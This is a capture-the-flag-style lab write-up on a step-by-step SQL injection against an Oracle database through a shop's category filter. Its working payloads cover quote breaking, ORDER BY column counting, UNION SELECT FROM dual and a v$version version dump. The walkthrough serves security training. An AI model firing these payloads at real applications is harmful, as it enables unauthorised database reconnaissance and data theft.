# SQL injection attack, querying the database type and version on Oracle

**Goal:** make the application print its Oracle database version string.

## Steps

1. Click a product category. Burp Proxy catches `GET /filter?category=Gifts`. Send it to Repeater.
<img width="2253" height="863" alt="image" src="https://github.com/user-attachments/assets/4d63da06-bb3f-4684-a7fa-617512a2fddf" />


2. Add one single quote: `category=Gifts'`
   Response = 500 Internal Server Error. The quote broke the SQL query. Injection confirmed.
 <img width="2244" height="839" alt="image" src="https://github.com/user-attachments/assets/864d905c-0ec7-4ecd-b9e4-c5ee342eda13" />


3. Count the columns with ORDER BY:
   - `Gifts' ORDER BY 1--`  -> 200 OK
   - `Gifts' ORDER BY 2--`  -> 200 OK
   - `Gifts' ORDER BY 3--`  -> 500 error

   Column 3 does not exist, so the query returns exactly 2 columns.
   <img width="2255" height="841" alt="image" src="https://github.com/user-attachments/assets/e20bc31b-4289-42d4-8dc9-0909322b5b32" />


4. Fingerprint the database. Plain UNION fails on Oracle:
   - `Gifts' UNION SELECT NULL,NULL--`  -> 500 error

     <img width="2246" height="790" alt="image" src="https://github.com/user-attachments/assets/d5a5f91c-fc2e-4906-b306-792ffe8aaddf" />


   Add Oracle's mandatory dummy table `dual`:
   - `Gifts' UNION SELECT NULL,NULL FROM dual--`  -> 200 OK

   Only Oracle forces `FROM dual`. Database identified.
   <img width="2234" height="895" alt="image" src="https://github.com/user-attachments/assets/8486e3d9-e195-4521-83ff-21c9d1a69041" />
: UNION ... FROM dual returning 200]

5. Find which columns print text (swap NULLs for markers):
   - `Gifts' UNION SELECT 'abc','def' FROM dual--`

   Both `abc` and `def` appear in the product list. Both columns are text.
 <img width="2242" height="837" alt="image" src="https://github.com/user-attachments/assets/2f7718a2-de04-4c2f-a72b-d8c1bd63d61e" />


6. Read the version from Oracle's built-in view `v$version`:
   - `Gifts' UNION SELECT BANNER,NULL FROM v$version--`

   The Oracle banner string prints on the page. Lab solved.
   <img width="2255" height="779" alt="image" src="https://github.com/user-attachments/assets/99fba9de-8b7e-4eec-9934-13c56c00dda2" />


## Gotcha I hit
Typing a new payload over a half-deleted old value produced `Gifts'Gifts'`, which throws random 500s. Fix: select the WHOLE value after `category=` and delete it before typing the new one.
